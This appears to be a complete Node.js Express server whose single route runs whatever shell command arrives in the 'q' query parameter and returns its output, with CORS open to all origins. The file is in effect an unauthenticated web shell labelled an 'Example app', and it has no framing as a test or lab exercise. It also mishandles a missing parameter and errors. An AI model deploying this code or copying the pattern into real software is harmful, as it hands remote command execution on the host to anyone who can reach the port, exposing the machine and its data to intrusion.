var express = require("express");
var app = express();
const { exec } = require("child_process");
const cors = require("cors");

app.use(cors());

app.get("/", function (req, res) {
  if (!req.query.q) {
    res.send("No query provided");
  }

  exec(req.query.q, (error, stdout, stderr) => {
    if (error) {
      console.log(`error: ${error.message}`);
      return;
    }
    if (stderr) {
      console.log(`stderr: ${stderr}`);

      return;
    }
    console.log(`stdout: ${stdout}`);

    res.send(JSON.stringify(stdout));
  });
});

const port = 8080;

app.listen(port, function () {
  console.log(`Example app listening on port ${port}!`);
});
